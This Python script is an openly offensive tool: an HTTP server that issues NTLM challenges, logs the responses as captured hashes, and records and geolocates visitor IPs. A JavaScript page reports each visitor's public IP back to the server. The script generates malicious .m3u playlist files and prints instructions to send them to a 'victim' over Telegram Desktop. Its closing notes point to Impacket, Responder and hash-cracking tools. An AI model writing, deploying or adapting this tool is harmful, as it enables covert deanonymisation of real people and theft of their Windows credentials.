import http.server
import socketserver
import threading
import logging
import requests
import time
import os
import base64
import sys
from requests_ntlm import HttpNtlmAuth
import socket
import argparse
import urllib.request
import random
import webbrowser

# Step 1: Set up logging for both IPs and NTLM hashes
logging.basicConfig(filename='ip_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
ntlm_logger = logging.getLogger('ntlm')
ntlm_handler = logging.FileHandler('ntlm_log.txt')
ntlm_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
ntlm_logger.addHandler(ntlm_handler)
ntlm_logger.setLevel(logging.INFO)

# Create console logger for real-time display
console_logger = logging.getLogger('console')
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
console_logger.addHandler(console_handler)
console_logger.setLevel(logging.INFO)

# Step 2: Define a custom HTTP request handler for IP logging and NTLM authentication
class NtlmRequestHandler(http.server.SimpleHTTPRequestHandler):
    def get_client_ip_port(self):
        # Try to get the real IP address from various headers
        client_ip = None
        
        # Check common proxy headers in order of reliability
        headers_to_check = [
            'X-Forwarded-For',
            'X-Real-IP',
            'CF-Connecting-IP',  # Cloudflare
            'True-Client-IP',
            'X-Client-IP',
            'Forwarded'
        ]
        
        for header in headers_to_check:
            header_value = self.headers.get(header)
            if header_value:
                if header == 'Forwarded':
                    # Parse the Forwarded header which has a different format
                    for part in header_value.split(';'):
                        if part.strip().lower().startswith('for='):
                            client_ip = part.split('=', 1)[1].strip().strip('"[]')
                            break
                else:
                    # X-Forwarded-For and similar headers may contain multiple IPs
                    client_ip = header_value.split(',')[0].strip()
                
                if client_ip:
                    break
        
        # If no headers found, use the client_address as fallback
        if not client_ip:
            client_ip = self.client_address[0]
            
            # Check if this is a local/private IP and we need to determine public IP
            if client_ip.startswith(('10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', 
                                   '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', 
                                   '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', 
                                   '172.31.', '192.168.', '127.')):
                console_logger.info(f"Client has private IP: {client_ip}, will attempt to log real public IP")
        
        port = self.client_address[1]
        return client_ip, port
    
    def get_ip_page(self):
        """Generate HTML page that uses JavaScript to get client's public IP"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>IP Check</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
                #ip-display { font-size: 18px; margin: 20px; padding: 10px; border: 1px solid #ccc; }
                .loading { color: #888; }
                .success { color: green; }
                .error { color: red; }
            </style>
        </head>
        <body>
            <h1>IP Detection Tool</h1>
            <div id="ip-display" class="loading">Detecting your public IP address...</div>
            
            <script>
                // Function to get the public IP using multiple services for redundancy
                async function getPublicIP() {
                    const ipElement = document.getElementById('ip-display');
                    
                    try {
                        // Try using ipify API first
                        const response = await fetch('https://api.ipify.org?format=json');
                        const data = await response.json();
                        
                        if (data && data.ip) {
                            ipElement.textContent = `Your public IP: ${data.ip}`;
                            ipElement.className = 'success';
                            
                            // Report back to server
                            fetch(`/report-ip?ip=${data.ip}`);
                            return;
                        }
                    } catch (error) {
                        console.error('Error with ipify:', error);
                    }
                    
                    try {
                        // Fallback to jsonip.com
                        const response = await fetch('https://jsonip.com');
                        const data = await response.json();
                        
                        if (data && data.ip) {
                            ipElement.textContent = `Your public IP: ${data.ip}`;
                            ipElement.className = 'success';
                            
                            // Report back to server
                            fetch(`/report-ip?ip=${data.ip}`);
                            return;
                        }
                    } catch (error) {
                        console.error('Error with jsonip:', error);
                    }
                    
                    ipElement.textContent = 'Could not detect your public IP address';
                    ipElement.className = 'error';
                }
                
                // Run the IP detection when page loads
                window.onload = getPublicIP;
            </script>
        </body>
        </html>
        """
        return html.encode()

    def do_GET(self):
        # Get and log the client's real IP address and port
        client_ip, client_port = self.get_client_ip_port()
        connection_info = f"Client connection: IP={client_ip}, Port={client_port}"
        
        # Log to file
        logging.info(connection_info)
        
        # Display in terminal immediately
        console_logger.info(f"[NEW CONNECTION] {connection_info}")
        
        # Log details about the request
        user_agent = self.headers.get('User-Agent', 'Unknown')
        console_logger.info(f"[REQUEST DETAILS] Path: {self.path}, User-Agent: {user_agent}")

        # Handle special routes
        if self.path == '/ip':
            # Serve the IP detection page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.get_ip_page())
            return
        elif self.path.startswith('/report-ip?ip='):
            # Handle IP reporting from client-side JavaScript
            try:
                reported_ip = self.path.split('=')[1]
                report_message = f"Client {client_ip}:{client_port} reported public IP: {reported_ip}"
                
                # Log the reported public IP
                logging.info(report_message)
                console_logger.info(f"[PUBLIC IP DETECTED] {report_message}")
                
                # Send confirmation response
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"IP reported successfully")
            except Exception as e:
                console_logger.error(f"Error processing reported IP: {str(e)}")
                self.send_error(400, "Invalid IP report")
            return
        
        # Handle NTLM authentication for other paths
        auth_header = self.headers.get('Authorization')
        
        if not auth_header:
            # First request - send NTLM challenge
            console_logger.info(f"[NTLM] Sending authentication challenge to {client_ip}:{client_port}")
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'NTLM')
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Authentication required")
            return

        if auth_header.startswith('NTLM'):
            ntlm_data = auth_header.split(' ')[1]
            try:
                # Decode the NTLM message
                decoded_data = base64.b64decode(ntlm_data)
                ntlm_message = f"NTLM Message from {client_ip}:{client_port}: {ntlm_data}"
                
                # Log to NTLM file
                ntlm_logger.info(ntlm_message)
                
                # Display in terminal immediately
                console_logger.info(f"[NTLM HASH CAPTURED] from {client_ip}:{client_port}")
                
                # Send success response
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"Authentication successful")
            except Exception as e:
                error_msg = f"Error processing NTLM data from {client_ip}:{client_port}: {str(e)}"
                ntlm_logger.error(error_msg)
                console_logger.error(f"[ERROR] {error_msg}")
                self.send_error(400, "Invalid NTLM data")
        else:
            self.send_error(401, "NTLM authentication required")

    def log_message(self, format, *args):
        # Override to prevent console spam, already logging with custom console_logger
        pass

# Step 3: Function to start the HTTP server in a separate thread
def start_server(port=8000):
    try:
        # Use "0.0.0.0" to listen on all available interfaces
        server = socketserver.TCPServer(("0.0.0.0", port), NtlmRequestHandler)
        print(f"Server started at port {port} on all interfaces")
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        return server
    except OSError as e:
        if e.errno == 98:  # Address already in use
            print(f"ERROR: Port {port} is already in use. Try a different port.")
            sys.exit(1)
        else:
            print(f"ERROR starting server: {e}")
            sys.exit(1)
    except Exception as e:
        print(f"Unexpected error starting server: {e}")
        sys.exit(1)

# Step 4: Function to generate the ip+port+ltlm hash .m3u file
def generate_m3u_file(server_url):
    # Standard m3u file for NTLM hash capture
    with open("ipltlmhash.m3u", "w") as f:
        f.write(server_url + "/ltlmhash.mp3")
    
    # Create a version specifically for just IP + Port detection
    with open("ip_detect.m3u", "w") as f:
        f.write(server_url + "/ip")
    
    print("Generated ipltlmhash.m3u and ip_detect.m3u files")

# Step 5: Function to get the location of an IP address using ipapi.co
def get_location(ip):
    url = f"https://ipapi.co/{ip}/json/"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return f"Country: {data.get('country_name', 'N/A')}, City: {data.get('city', 'N/A')}"
        else:
            return "Location not found"
    except Exception as e:
        return f"Error fetching location: {e}"

# Step 6: Function to read IPs from the log file and get their locations
def check_ip_logs():
    if not os.path.exists('ip_log.txt'):
        print("No IP log file found. No requests have been made yet.")
        return
    
    with open('ip_log.txt', 'r') as f:
        lines = f.readlines()
    
    # Extract unique IP:port combinations and reported public IPs
    ip_port_entries = set()
    reported_ips = {}  # Format: {(client_ip, client_port): reported_ip}
    
    for line in lines:
        parts = line.split(' - ')
        if len(parts) < 2:
            continue
            
        timestamp = parts[0].strip()
        message = parts[1].strip()
        
        # Handle regular connections
        if 'Client connection:' in message:
            ip_port_entries.add(message)
        
        # Handle reported public IPs
        elif 'reported public IP:' in message:
            try:
                # Extract client info and reported IP
                client_info = message.split('Client ')[1].split(' reported')[0]
                reported_ip = message.split('public IP: ')[1].strip()
                
                # Add to the dictionary
                reported_ips[client_info] = reported_ip
            except:
                pass
    
    if not ip_port_entries and not reported_ips:
        print("No IP addresses found in the log.")
        return
    
    print("\nCaptured connections and their locations:")
    for entry in ip_port_entries:
        # Extract IP from the entry
        try:
            ip = entry.split('IP=')[1].split(',')[0].strip()
            location = get_location(ip)
            print(f"{entry}, Location: {location}")
        except:
            print(f"{entry}, Location: Unknown")
    
    if reported_ips:
        print("\nReported public IPs from clients:")
        for client_info, public_ip in reported_ips.items():
            location = get_location(public_ip)
            print(f"Client {client_info} has public IP: {public_ip}, Location: {location}")

# Step 7: Function to read NTLM hashes from the log file
def check_ntlm_logs():
    if not os.path.exists('ntlm_log.txt'):
        print("No NTLM log file found. No NTLM authentication attempts were made.")
        return
    
    with open('ntlm_log.txt', 'r') as f:
        lines = f.readlines()
    
    if not lines:
        print("No NTLM hashes captured.")
        return
    
    print("\nCaptured NTLM Hashes:")
    for line in lines:
        print(line.strip())

# Step 8: Example of how a client might use requests-ntlm to authenticate (for context)
def test_ntlm_client(server_url, username, password):
    print("\nTesting NTLM client authentication (for demonstration purposes):")
    session = requests.Session()
    session.auth = HttpNtlmAuth(f'domain\\{username}', password)
    try:
        response = session.get(server_url)
        print(f"Client authentication response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Client authentication failed: {e}")

# Add this function to help with network debugging
def check_network_connectivity():
    """Check network configuration and connectivity"""
    try:
        # Get hostname
        hostname = socket.gethostname()
        print(f"Hostname: {hostname}")
        
        # Get all local IP addresses
        local_ips = []
        try:
            # Get all addresses from socket
            for ip in socket.getaddrinfo(hostname, None):
                if ip[0] == socket.AF_INET:  # Only IPv4
                    local_ips.append(ip[4][0])
            
            # Remove duplicates
            local_ips = list(set(local_ips))
            print(f"Local IP addresses: {', '.join(local_ips)}")
        except Exception as e:
            print(f"Error getting local IPs: {e}")
        
        # Try to get public IP
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                public_ip = s.getsockname()[0]
                print(f"Outgoing IP: {public_ip}")
        except Exception as e:
            print(f"Error getting outgoing IP: {e}")
            
        print("\nTesting connection to public IP detection services:")
        for service, url in [
            ("ipify.org", "https://api.ipify.org"),
            ("jsonip.com", "https://jsonip.com")
        ]:
            try:
                response = requests.get(url, timeout=3)
                print(f"  ✓ {service} is accessible ({response.status_code})")
            except Exception as e:
                print(f"  ✗ {service} error: {e}")
                
    except Exception as e:
        print(f"Network check error: {e}")
    
    print("\nFirewall/port forwarding: Ensure that:")
    print("1. Your firewall is not blocking incoming connections on port 8001")
    print("2. If you're behind a router, port 8001 is forwarded to this machine")
    print("3. If you're in a cloud environment, the security group/network ACL allows port 8001\n")

def test_server_connectivity(server_url):
    """Perform self-test to determine if the server is publicly accessible"""
    print("\n========== Server Accessibility Test ==========")
    print(f"Testing if {server_url} is publicly accessible...")
    
    # Method 1: Try to connect to the server through external services
    print("\nMethod 1: External service check:")
    test_id = random.randint(10000, 99999)
    test_url = f"{server_url}/connectivity-test-{test_id}"
    external_checkers = [
        {
            "name": "Is It Up",
            "url": f"https://www.isitup.org/{server_url.replace('http://', '')}"
        },
        {
            "name": "hping.online",
            "url": f"https://hping.online/check?host={server_url.replace('http://', '')}"
        }
    ]
    
    print("You can manually check these URLs to see if your server is accessible:")
    for checker in external_checkers:
        print(f"  → {checker['name']}: {checker['url']}")
    
    # Method 2: Direct test using urllib
    print("\nMethod 2: Direct connection attempt:")
    try:
        urllib.request.urlopen(f"{server_url}/ip", timeout=5)
        print("✓ SUCCESS: Server appears to be accessible from the internet!")
    except Exception as e:
        print(f"✗ FAILED: Could not connect to server: {e}")
        print("\nPossible reasons and solutions:")
        print("1. Your server is behind a firewall or NAT - Configure port forwarding")
        print("2. The server IP address is incorrect - Use your actual public IP")
        print("3. ISP is blocking the port - Try a different port with --port or --alt-ports")
        print("4. Server not running correctly - Check for any errors above")
    
    # Method 3: Suggest ngrok for easy tunneling
    print("\nMethod 3: Use ngrok for reliable public access:")
    print("If you can't get your server accessible, consider using ngrok:")
    print("1. Download ngrok from https://ngrok.com/download")
    print("2. Run: ngrok http 8001 (or whatever port you're using)")
    print("3. Use the ngrok URL instead of your IP address")
    
    print("\nWould you like to open your server URL in a browser to test it? (y/n)")
    response = input().lower()
    if response == 'y' or response == 'yes':
        print(f"Opening {server_url}/ip in your browser...")
        webbrowser.open(f"{server_url}/ip")
    
    print("================================================\n")

# Main execution
if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='IP and NTLM hash detection server')
    parser.add_argument('--ip', type=str, help='Server IP address to use (default: auto-detect)')
    parser.add_argument('--port', type=int, default=8001, help='Port to listen on (default: 8001)')
    parser.add_argument('--alt-ports', action='store_true', help='Try alternative ports (80, 443, 8080) if primary port fails')
    args = parser.parse_args()
    
    # Network configuration check
    print("\n========== Network Configuration Check ==========")
    check_network_connectivity()
    print("================================================\n")
    
    # Determine server IP to use
    server_ip = args.ip
    if not server_ip:
        try:
            # Try to get outgoing IP as the default
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                server_ip = s.getsockname()[0]
                print(f"Auto-detected IP: {server_ip}")
        except:
            # Fallback to the original IP if auto-detection fails
            server_ip = "14.225.208.213"
            print(f"Using provided IP: {server_ip}")
    
    # Try to start the server on the specified port
    port = args.port
    alternative_ports = [80, 443, 8080, 8000] if args.alt_ports else []
    
    # Try the primary port first
    try:
        server_url = f"http://{server_ip}:{port}"
        server = start_server(port)
        print(f"Server successfully started on {server_ip}:{port}")
    except Exception as e:
        print(f"Failed to start server on port {port}: {e}")
        
        # If alternative ports are enabled, try them one by one
        if alternative_ports:
            print("Trying alternative ports...")
            for alt_port in alternative_ports:
                try:
                    server_url = f"http://{server_ip}:{alt_port}"
                    server = start_server(alt_port)
                    port = alt_port  # Update port to the successful one
                    print(f"Server successfully started on {server_ip}:{port}")
                    break
                except Exception as e:
                    print(f"Failed to start server on port {alt_port}: {e}")
            else:
                print("Could not start server on any port. Please check your network configuration.")
                sys.exit(1)
        else:
            print("Use --alt-ports to try alternative ports automatically.")
            sys.exit(1)

    # Generate the malicious .m3u file
    generate_m3u_file(server_url)

    console_logger.info(f"Server running at {server_url}")
    console_logger.info("Waiting for connections... Press Ctrl+C to stop the server and view results.\n")
    
    # Add server accessibility test after starting
    test_server_connectivity(server_url)
    
    print(f"\nInstructions:")
    print(f"1. Send the 'ipltlmhash.m3u' file to the victim via Telegram Desktop (Windows).")
    print(f"   - This attempts to capture IP + Port and the NTLM hashes.")
    print(f"   OR")
    print(f"   Send the 'ip_detect.m3u' file to the victim, which will automatically direct them to the IP detection page.")
    print(f"2. Wait for the victim to open the file, which may trigger a request to your server.")
    print(f"3. If the victim's system supports NTLM authentication, the server may capture the NTLM hash.")
    print(f"4. To get the client's real public IP address, have them visit: {server_url}/ip")
    print(f"   This will serve a page that uses JavaScript to detect their public IP and report it back.")
    print(f"5. Press Ctrl+C to stop the server and check the captured IPs and NTLM hashes.\n")

    try:
        # Keep the script running until the user stops it
        console_logger.info("Server is running. New connections will be displayed here...")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping server...")
        server.shutdown()
        server.server_close()
        print("Server stopped.")

        # Check the logs for captured IPs and their locations
        check_ip_logs()

        # Check the logs for captured NTLM hashes
        check_ntlm_logs()

        print("\nImportant Notes:")
        print("1. The requests-ntlm library is designed for client-side NTLM authentication, not server-side.")
        print("   This script manually requests NTLM authentication, but it does not fully process the NTLM handshake.")
        print("   For proper NTLM hash capture, consider using tools like Impacket or Responder.")
        print("2. NTLM hash capture depends on the victim's system attempting NTLM authentication.")
        print("   This may not occur if Telegram does not trigger NTLM for HTTP requests, or if the victim's system blocks such authentication.")
        print("3. Captured NTLM hashes can be cracked using tools like Hashcat or John the Ripper, but this is beyond the scope of this script.")